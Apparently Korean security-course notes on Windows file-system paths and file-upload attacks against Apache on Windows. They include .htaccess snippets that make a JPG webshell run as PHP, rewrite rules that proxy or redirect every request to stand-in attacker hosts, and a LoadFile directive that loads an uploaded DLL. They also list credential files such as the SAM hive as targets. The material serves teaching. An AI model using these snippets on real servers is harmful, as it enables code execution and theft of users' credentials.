# File Vulnerabilities for Windows

* 윈도우(Windows) 운영 체제의 특징
    - 기본적으로 마이크로소프트 Internet Information Services(IIS) Server 내장 웹 서버를 제공하고, 아파치 웹 서버와 nginx 등의 소프트웨어를 설치해 사용할 수 있음
    - 과거에 개발된 DOS 프로그램과 유닉스 운영 체제와의 호환성을 위해 다양한 경로 표기법이 존재함
        | 장점 (개발자 입장) | 단점 (공격자 입장) |
        |---|---|
        | 호환성과 유연한 서비스를 보장하는 프로그램을 개발할 수 있음 | 경로 표기 문자 검사를 우회하고 공격할 수 있음 |

<br/>

## Windows 파일 시스템
* 윈도우 파일 시스템의 특징
    - 리눅스와 달리 **드라이브**를 지정할 수 있음
        + 일반적으로 윈도우를 구성하고 애플리케이션 파일 등의 중요한 파일은 C 드라이브에 위치함
    - 파일 시스템 접근만으로 시스템 제어가 어려움
        + 유닉스 계열의 운영 체제와 윈도우 운영 체제의 비교
            | 종류 | 설명 |
            |---|-----|
            | 유닉스 계열의 운영 체제 | 대부분이 파일로 구성되어 있음 → **파일에 접근하는 것만으로도** 특정 기능을 수행할 수 있음 |
            | 윈도우 기반의 NT 아키텍처 | VMS 계열의 운영 체제에서 영향을 받았기 때문에 객체 지향 인터페이스를 사용함 <br/>&nbsp;&nbsp; → **기능에 알맞는 API를 사용**해야 함 |
    - 📚 참고: [윈도우 특수 폴더](https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)

<br/>

### 윈도우 파일 시스템의 파일 종류
| 종류 | 설명 |
|---|------|
| 로그 및 데이터 파일 | 운영 체제 및 서비스의 로그와 각종 문서가 저장되는 위치 |
| 설정 파일 | 운영 체제 및 서비스를 구성하는 설정 파일 |
| 프로그램 및 라이브러리 | 프로그램의 명령어가 저장된 위치와 이들을 실행하기 위한 라이브러리의 위치 |
| 장치 및 가상 파일 | 운영 체제를 구성하기 위한 파일 |
| 임시 파일 | 운영 체제 및 서비스에서 사용하는 임시 디렉터리 |

<br/>

* 로그 및 데이터 파일
    | 디렉터리 | 설명 |
    |---|------|
    | C:\inetpub | IIS 서비스에서 웹 문서 및 기타 웹 서버에서 사용하는 파일을 저장함 |
    | C:\inetpub\wwwroot | IIS의 웹 문서가 저장되는 기본 경로 |
    | C:\ApacheXY\htdocs, <br/> C:\www | Apache Web Server에서 문서 경로로 흔히 사용되는 디렉터리 |
    | C:\Program Files | 각종 프로그램 및 데이터를 저장할 때 사용 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | C:\ProgramData | 시스템의 각종 서비스에서 자료를 저장할 때 사용함 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | C:\ProgramData\MySQL\MySQL Server X.Y\Data | MySQL 데이터베이스의 데이터가 일반적으로 여기에 저장됨 |
    | C:\ProgramData\PostgreSQL\X.Y\data | PostgreSQL 데이터베이스의 데이터가 일반적으로 여기에 저장됨 |
    | C:\Windows\System32\Winevt\Logs | 윈도 이벤트 로그를 저장할 때 사용함 |
    | C:\Windows\Prefetch | Superfetch 데이터를 저장함 <br/> &nbsp;&nbsp; - 최근 사용한 애플리케이션 목록 등을 조회할 수 있음 |

<br/>

* 설정 파일
    | 디렉터리 | 설명 |
    |---|------|
    | C:\Windows\System32\config | 시스템 단위 레지스트리 하이브 파일이 저장됨 |
    | C:\Boot | 부팅 관련 파일을 저장함 <br/> &nbsp;&nbsp; - EFI 기반 시스템에서는 EFI 시스템 파티션에 저장됨 |
    | %UserProfile%\Ntuser.dat |```%UserProfile%``` 프로필 디렉터리를 가진 사용자의 레지스트리가 저장됨 |
    | %UserProfile%\Local Settings\Application Data\Microsoft\Winodws\UsrClass.dat | ```%UserProfile%``` 프로필 디렉터리를 가진 사용자의 확장자 연결 정보 및 COM 클래스 등이 저장됨 |
    | C:\Windows\drivers\etc | ```hosts```, ```service```와 같은 네트워크 관련 설정 파일을 저장함 |
    | C:\Program Files\Apache Software Foundation\Apache<버전>\conf | Apache Web Server의 설정 정보를 저장함 |

    | 파일 | 설명 |
    |---|------|
    | C:\Boot\BCD | Boot Configuration Data 파일이 위치함 |
    | C:\ProgramData\MySQL\MySQL Server X.Y\my.ini | MySQL 데이터베이스 서버의 주 설정 파일 |
    | C:\Windows\System32\drivers\etc\hosts | 호스트네임의 실제 주소를 탐색할 때 사용되는 정적 순람표 |

<br/>

* 프로그램 및 라이브러리
    | 디렉터리 | 설명 |
    |---|------|
    | C:\Program Files | 각종 프로그램 및 데이터를 저장할 때 사용함 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | C:\Windows\System32 | 시스템 파일 및 DLL들이 위치함 |
    | C:\Windows\SysWOW64 | 32비트 호환(Windows-on-Windows) 레이어 상 시스템 파일 및 DLL들이 위치함 |

<br/>

* 장치 밀 가상 파일
    | 디렉터리 | 설명 |
    |---|------|
    | \\\\.\ | Win32 장치 파일을 접근하는 경로의 시작을 나타냄 <br/> &nbsp;&nbsp; - ```NUL```, ```CON```과 같은 기본 장치 이름은 시스템 라이브러리에서 자동으로 인식됨 → ```\\.\```을 사용할 필요가 없음 |
    | \\\\?\ | NT 객체 관리자 하위체계(Object Manager Subsystem, Ob)의 객체 및 심볼릭 링크 등을 접근하는 경로의 시작을 나타냄 <br/> &nbsp;&nbsp; - 기본 경로는 ```\\.\```와 같음 |
    | \\\\?\GLOBALROOT\ | 실제 Object Manager의 최상위 경로를 접근하는 경로 |
    | \\\\?\GLOBALROOT\Device | NT 장치 객체를 포함하는 디렉터리 |
    | \??\ | ```\\?\```와 동일하게 사용 (와일드 카드 등의 문자가 다른 의미를 지니게 된다는 점에 주의) |
    | \\\\<호스트명>\<공유명>\ | 네트워크 상에 공유된 자원에 접근할 수 있는 UNC 경로를 나타냄 |

    | 장치 파일 | 설명 |
    |---|------|
    | NUL, CON, AUX, PRN, <br/>COM1, COM2, COM3, COM4, <br/>LPT1, LPT2, LPT3, LPT4 | 예약된(reserved) DOS 기본 장치 이름 <br/> &nbsp;&nbsp; - ```\\.\NUL```과 같이 사용할 수도 있음 (```\\.\``` 생략도 가능함) |
    | CON(```\\.\CON```) | 현재 콘솔 장치를 나타냄 |
    | CONIN$(```\\.\CONIN$```) | 현재 콘솔 입력 장치를 나타냄 |
    | CONOUT$(```\\.\CONOUT$```) | 현재 콘솔 출력 장치를 나타냄 |
    | \\\\?\GLOBALROOT\Device\HarddiskVolum\<N\> | 다른 드라이브를 선택할 때 ```C:\```와 같은 문법 대신 사용 가능 |

<br/>

* 임시 파일
    | 디렉터리 | 설명 |
    |---|------|
    | C:\Windows\Temp | 임시 파일을 저장함 |
    | %UserProfile%\AppData\Local\Temp | 일반적으로 사용자별 임시 팡리이 저장되는 경로 |

<br/><br/>

## 파일 업로드 공격
* 일반적으로 윈도우 웹 서버는 ```AUTHORITY\LocalService``` 또는 ```NTAUTHORITY\NetworkService``` 사용자 권한으로 실행됨
    - 웹 서비스가 높은 권한이 아닌 일반 권한으로 실행됨 → **파일 업로드 공격으로 인한 피해를 최소화할 수 있음**
    - 웹 서버의 파일 시스템 구조를 이해하고 있다면 일반 권한으로 덮어쓸 수 있는 파일을 덮어써서 임의 코드를 실행 할 수 있음

<br/>

### Apache Web Server: 일반 권한으로 임의 코드를 실행하는 방법
* 아파치 웹 서버의 설정 파일
    - 일반적으로 **C:\ApacheXY\htdocs** 또는 **C:\www** 디렉터리에서 관리함
    - 설정 파일 내에서 ```AccessFileName``` 지시어를 사용하면 설정 파일을 분산하여 관리할 수도 있음
        ```Apache
        AccessFileName filename [filename ...]
        ```
        + 기본값: [.htaccess](https://httpd.apache.org/docs/2.4/ko/howto/htaccess.html) 파일
            ```Apache
            AccessFileName .htaccess
            ```
            - ⚠️ **.htaccess 파일은 웹 서버의 권한만 있다면 덮어쓸 수 있음 → .htaccess 파일을 사용하는 웹 서버에서 파일 업로드 취약점 발생 시 다양한 공격 행위를 수행할 수 있음**
        + ```AccessFileName``` 지시어로 설정한 설정 파일에서 모든 설정을 변경할 수 있는 것은 아님
            - ```AllowOverride```와 ```AllowOverrideList``` 지시어를 통해 명시한 지시어만 사용할 수 있음 (참고: [AllowOverride Documentation](https://httpd.apache.org/docs/2.4/ko/mod/core.html#allowoverride))

* .htaccess 파일을 이용해 공격하는 방법
    - 웹 셸: ```.php``` 확장자 이외의 다른 확장자를 PHP 스크립트로 해석하도록 설정을 변경 (확장자 우회)
        + ```<Files>``` 섹션을 이용한 확장자 우회 예시 (참고: 📚 [Apache \<File\> Directive](https://sidoservice.seoul.go.kr/manual/ko/mod/core.html#files), 📚 [Apache Sections manual](https://sidoservice.seoul.go.kr/manual/ko/sections.html))
            ```Apache
            <Files "webshell-dreamhack.jpg">
                # php-fpm (PHP FastCGI Process Manager)을 사용하는 경우
                SetHandler "proxy:fcgi://locatlhost"
                # Apache2 자체 mod_php를 사용하는 경우
                SetHandler application/x-httpd-php
            </Files>
            ```
            - ```<Files>``` 섹션에 포함된 지시어들은 어떤 디렉토리에 있는지 관계없이 지정한 이름을 가진 파일에 적용됨
                + 위치와 관계 없이 "webshell-dreamhack.jpg"이란 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 처리함
    - 요청 리다이렉트: 모든 요청을 공격자의 웹 서버로 전달하도록 설정을 변경
        + 공격자 서버 리다이렉트 예시
            ```Apache
            RewriteEngine On
            RewriteOptions inherit # 부모의 설정을 상속받음 (inherit)

            # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
            RewriteRule (.*) fcgi://attacker.example.com.$1 [P]

            # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [P]

            # HTTP Redirect 적용
            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [R=302, L]

            # 에러 페이지를 공격자의 웹 페이지로 리다이렉트함
            ErrorDocument 404 https://attacker.dreamhack
            ```
            - 사용한 지시어 설명
                | 지시어 | 설명 | 참고 |
                |---|-----|---|
                | RewriteEngine | Runtime Rewriting Engine을 활성화(On) 또는 비활성화(Off)함 | 📚 [RewriteEngine Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteengine) |
                | RewriteOptions | 현재 서버별 또는 디렉토리별 구성에 대한 일부 특수 옵션을 설정함 (inherit, AllowAnyURI, MergeBase 중 하나만 될 수 있음) | 📚 [RewriteOptions Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteoptions) | 
                | RewriteRule | Rewrite Engine에 대한 규칙을 정의함 <br/> &nbsp;&nbsp; - 형식: ```RewriteRule Pattern Substitution [flags]``` | 📚 [RewriteRule Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriterule) |
                | ErrorDocument | 문제/오류 발생 시 다음의 네 가지 중 하나를 수행하도록 함 <br/> &nbsp;&nbsp; - 하드코딩된 간단한 오류 메시지 출력 <br/> &nbsp;&nbsp; - 커스텀한 메시지 출력 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 내부적으로 로컬 URL 경로로 리다이렉션 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 외부 URL로 리다이렉션 | 📚 [ErrorDocument Directive](https://httpd.apache.org/docs/2.2/ko/mod/core.html#errordocument) |
        + 요청 중에 계정 정보를 포함한 민감한 정보가 포함되어 있다면 이를 또 다른 목적으로 사용할 수 있음
    - 공유 라이브러리: 사전에 업로드한 라이브러리 파일을 로드해 임의 코드를 실행할 수 있도록 설정을 변경
        + C:\www 디렉터리 내 파일들을 조작할 수 있어야 공격에 성공할 수 있음
        + 변경 사항을 웹 서버에 반영하기 위해서는 서비스 재시작이 필요함
        + 공유 라이브러리 로드 예시
            ```Apache
            # 서버가 재시작할 때 C:\www\path\injected\library.dll을 읽어들여 임의 코드를 실행함
            LoadFile "C:\www\path\injected\library.dll"
            ```
            - 사용한 지시어 설명
                | 지시어 | 설명 | 참고 |
                |---|------|---|
                | LoadFile | **서버가 시작하거나 재시작할 때** 지정한 목적 파일이나 라이브러리를 읽어들임(link in) <br/> &nbsp;&nbsp; - 형식: ```LoadFile filename [filename ...]``` | 📚 [LoadFile Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_so.html#loadfile) |

<br/>

> #### **Apache Web Server의 지시어 목록**
> 표준 아파치 배포판에서 사용 가능한 지시어의 목록은 [여기](https://httpd.apache.org/docs/2.2/ko/mod/directives.html#R)에 정리되어 있으며, 각 지시어를 클릭하면 상세 설명을 볼 수 있음

<br/>

### 파일 업로드 공격에서 이용할 수 있는 파일 목록
* 임의의 경로로 높은 권한을 획득했을 때 이용할 수 있는 시스템 파일
    | 파일 | 설명 |
    |---|------|
    | C:\Windows\System32\config\systemprofile | ```NT AUTHORITY\SYSTEM```의 사용자 프로필 계정 <br/> &nbsp;&nbsp; - Linux의 ```/root```에 대응됨 |
    | C:\Windows\System32\config\System <br/> C:\Windows\System32\config\System.alt <br/> C:\Windows\System32\config\System.log <br/> C:\Windows\System32\config\System.sav | ```HKEY_LOCAL_MACHINE\SYSTEM``` 레지스트리 키에 해당하는 하이브 파일 <br/> &nbsp;&nbsp; - 주요 시스템 설정 정보를 저장함 |
    | C:\Windows\System32\config\Software <br/> C:\Windows\System32\config\Software.log <br/> C:\Windows\System32\config\Software.sav | ```HKEY_LOCAL_MACHINE\SOFTWARE```레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 설치된 소프트웨어에서 사용됨 |
    | C:\Windows\System32\config\SAM <br/> C:\Windows\System32\config\SAM.log <br/> C:\Windows\System32\config\SAM.sav  | ```HKEY_LOCAL_MACHINE\SAM``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 사용자 비밀번호 및 인증 정보 등을 저장함 <br/> &nbsp;&nbsp; - SAM: Security Account Manager의 약자 |
    | C:\Windows\System32\config\Security <br/> C:\Windows\System32\config\Security.alt <br/> C:\Windows\System32\config\Security.log <br/> C:\Windows\System32\config\Security.sav | ```HKEY_LOCAL_MACHINE\Security``` 레지스터리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 윈도우의 보안 데이터베이스를 저장함 |
    | C:\Windows\System32\config\Default <br/> C:\Windows\Sytsem32\config\Default.log <br/> C:\Windows\System32\config\Default.sav | ```HKEY_USERS\DEFAULT``` 레지스터리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 사용자별 레지스크리 키의 기본 구조를 지정함 |

* 일반 권한으로 접근할 수 있는 설정 파일
    | 파일 | 설명 |
    |---|------|
    | %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup | 현재 사용자의 시작 프로그램 목록이 저장됨 |
    | %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp | 모든 로컬 사용자의 시작 프로그램 목록이 저장됨 |

<br/><br/>
